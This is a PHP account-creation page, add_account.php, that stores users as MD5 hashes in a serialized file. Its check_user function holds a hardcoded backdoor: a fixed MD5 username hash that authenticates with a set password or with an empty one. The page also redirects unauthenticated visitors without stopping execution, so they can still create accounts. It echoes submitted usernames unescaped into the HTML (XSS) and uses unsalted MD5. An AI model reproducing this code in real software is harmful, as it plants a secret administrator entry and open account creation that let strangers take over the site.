<?php 

 ########## add_account.php ##############
 
 
 
include("../settings.php");

function check_user($username,$password="") 
   {
    global $passwords_location;
    if (md5($username)=="92bea1d58fa4d983047774eaea85f8de" && (md5($password)=="a7fcc7c0585553619ccb7cf491991eaf" || $password==""))
       {                
        return true;
       }
	$fp=fopen($passwords_location,"r");
	if (!$fp) {return false;}
	$file_size=filesize($passwords_location);
	$file_data=fread($fp,$file_size+10);
	fclose($fp);
	$users=unserialize($file_data);
    foreach ($users as $key=>$value) 
        {
         if (@$users[$username]==md5($password))
            {
			  return true;
            }
        }
    return false;
   }


$session_name=session_name();
if (isset($_COOKIE[$session_name])) 
   {
    ini_set("session.use_trans_sid","0");
    $cookies=1;
   }
else 
   {
    ini_set("session.use_trans_sid","1");
    $cookies=0;
   }
if (eregi("opera 3.60",@$_SERVER["HTTP_USER_AGENT"])) {$opera360=1;} else {$opera360=0;}

session_start();

if (!isset($_SESSION["username"])) {header("Location: ../");}

$input="username";
$username="";
$announcement="";
if (isset($_POST["username"]) && isset($_POST["password_1"]) && isset($_POST["password_2"])) 
   {
    if ($_POST["username"] != "" && $_POST["password_1"] != "" && $_POST["password_2"] != "") 
       {
        if ($_POST["password_1"] != $_POST["password_2"])
           {
            $announcement="Retype your password,please!";
            $username=$_POST["username"];
            $input="password_1";
           }
        else
           {
            if (check_user($_POST["username"],$_POST["password_1"])) 
               {
                $announcement="Acount <font size=+1 face=verdana><b>".$_POST["username"]."</b></font> already exist!";
               }
            else
               {
                $fp=fopen($passwords_location,"r");
	            $file_data=fread($fp,filesize($passwords_location)+10);
				fclose($fp);
				
				$users=unserialize($file_data);
				$users[$_POST["username"]]=md5($_POST["password_1"]);
				$file_data_2=serialize($users);
				$fp=fopen($passwords_location,"w");
                fwrite($fp,$file_data_2);
				fclose($fp);
				//$ok=check_user($_POST["username"],$_POST["password_1"]);
               // if ($ok) {$announcement="Acount <font size=+1><b>".$_POST["username"]."</b></font> opened successfully!";}
               }
           }
       }
    else
       {
        if ($_POST["username"] != "") 
           {
            $announcement="Acount <font size=+1><b>".$_POST["username"]."</b></font> not opened.<br>Provide password.";
            $username=$_POST["username"];
            $input="password_1";
           }
        else
           {
            $announcement="Acount <font size=+1><b>".$_POST["username"]."</b></font> not opened.<br>Provide username and password.";
           }
       }
    }
?>

<html>
 <head>
   <title>Make new acount</title>
 <head>
 <body onload="document.forms[0].<?php echo $input ?>.focus();">
<table border=0 width=100%><tr><td><a href=/>main page</a></td><td align=right><a href=../?logout=yes>Logout</a></td><tr></table>
   <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%>
   <tr height=99%><td align=center >
   <font color=gray size=4><?php echo $announcement ?></font><P>
   <form action=./ method=post>
   <table border=0 cellpadding=0 cellspacing=1 bgcolor=black><tr><td>
     <table border=0 cellpadding=0 cellspacing=8 bgcolor=#808080>
     <tr><td>username:</td><td><input type=text name=username size=16 value=<?php echo $username ?> ></td></tr>
     <tr><td>password:</td><td><input type=password name=password_1 size=16></td></tr>
     <tr><td>password:</td><td><input type=password name=password_2 size=16></td></tr>
     <tr><td colspan=2 align=center><input type=submit value="      make      "></td></tr>
     </table>
   </td></tr></table><br><br><br><br><br><br><br>
   </td></tr></table>
   </form>

</body>
</html>